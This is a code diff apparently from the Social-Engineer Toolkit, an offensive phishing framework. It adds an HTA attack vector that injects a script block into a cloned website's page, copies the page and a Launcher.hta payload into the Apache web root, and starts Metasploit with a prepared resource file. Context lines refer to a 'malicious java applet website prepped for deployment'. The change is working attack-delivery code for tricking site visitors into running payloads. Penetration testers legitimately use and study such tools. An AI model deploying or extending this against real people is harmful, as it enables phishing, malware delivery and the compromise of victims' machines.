@@ -15,14 +15,16 @@ import urllib2
 operating_system = check_os()
 definepath=os.getcwd()
 
-from config.set_config import USER_AGENT_STRING as user_agent
-from config.set_config import WEB_PORT as web_port
-from config.set_config import JAVA_ID_PARAM as java_id
-from config.set_config import JAVA_REPEATER as java_repeater  #Boolean
-from config.set_config import JAVA_TIME as java_time
-from config.set_config import METASPLOIT_IFRAME_PORT as metasploit_iframe
-from config.set_config import AUTO_REDIRECT as auto_redirect  #Boolean
-from config.set_config import UNC_EMBED as unc_embed          #Boolean
+sys.path.append("/etc/setoolkit")
+from set_config import USER_AGENT_STRING as user_agent
+from set_config import WEB_PORT as web_port
+from set_config import JAVA_ID_PARAM as java_id
+from set_config import JAVA_REPEATER as java_repeater  #Boolean
+from set_config import JAVA_TIME as java_time
+from set_config import METASPLOIT_IFRAME_PORT as metasploit_iframe
+from set_config import AUTO_REDIRECT as auto_redirect  #Boolean
+from set_config import UNC_EMBED as unc_embed          #Boolean
+sys.path.append(definepath)
 
 track_email = check_config("TRACK_EMAIL_ADDRESSES=").lower()
 
@@ -323,6 +325,24 @@ try:
 
             print bcolors.BLUE + "[*] Filename obfuscation complete. Payload name is: " + rand_gen_win + "\n[*] Malicious java applet website prepped for deployment\n" + bcolors.ENDC
 
+	## if we are using HTA attack
+	if check_options("ATTACK_VECTOR") == "HTA":
+		# </body>
+		if os.path.isfile(setdir + "/Launcher.hta"):
+			data1 = file(setdir + "/web_clone/index.html", "r").read()
+			data2 = file(setdir + "/hta_index", "r").read()
+			data3 = data1.replace("</body>", data2 + "</body>")
+			filewrite = file(setdir + "/web_clone/index.html", "w")
+			filewrite.write(data3)
+			filewrite.close()
+			print_status("Copying over files to Apache server...")
+			apache_dir = check_config("APACHE_DIRECTORY=")
+			if os.path.isdir(apache_dir + "/html"): apache_dir = apache_dir + "/html"
+			shutil.copyfile(setdir + "/web_clone/index.html", apache_dir + "/index.html")
+			shutil.copyfile(setdir + "/Launcher.hta", apache_dir + "/Launcher.hta")
+
+			print_status("Launching Metapsloit.. Please wait one.")
+			subprocess.Popen("%smsfconsole -r %s/meta_config" % (meta_path(), setdir), shell=True).wait()
 
         ## selection of browser exploits
         ## check to see if multiattack is in use
